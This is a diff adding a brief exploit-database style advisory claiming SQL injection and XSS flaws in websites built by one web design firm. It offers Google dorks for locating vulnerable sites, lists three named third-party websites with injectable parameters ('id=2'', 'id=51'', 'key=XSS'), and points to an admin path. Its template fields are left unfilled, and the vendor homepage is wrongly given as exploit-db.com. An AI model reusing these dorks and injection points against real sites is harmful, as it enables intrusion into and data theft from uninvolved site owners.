@@ -1,0 +1,35 @@
+# Exploit Title: Colourmoon (P) LTD Portal SQL INJ & Xss
+
+# Google Dork: intext:"Designed By Colourmoon (P) LTD " inurl:"php?id="
+
+# Google Dork2: intext:"Designed By Colourmoon (P) LTD "
+
+# Dork 3:https://www.thecolourmoon.com/portfolio_websites.php
+
+# Date: 16.01.2016
+
+# Exploit Author: No.3_Zemin
+
+# Vendor Homepage: exploit-db.com
+
+# Software Link: https://www.thecolourmoon.com/ || htp://websitedemo.pro
+
+# Version: [app version] (REQUIRED)
+
+# Tested on: Kali Lİnux 2,Windows 7 Pro.
+
+# CVE : [if applicable]
+
+--------------------------------------------------------
+
+Examples: http://medigreens.in/product_view.php?id=2' SQL
+
+http://www.sreesreenidhi.com/service.php?id=51' SQL
+
+http://mintmart.in/search.php?key=XSS
+
+admin path >> xxx.com/admin
+
+####3Thanks exploit-db team||No.3_Zemin########
+
+##################################################################3
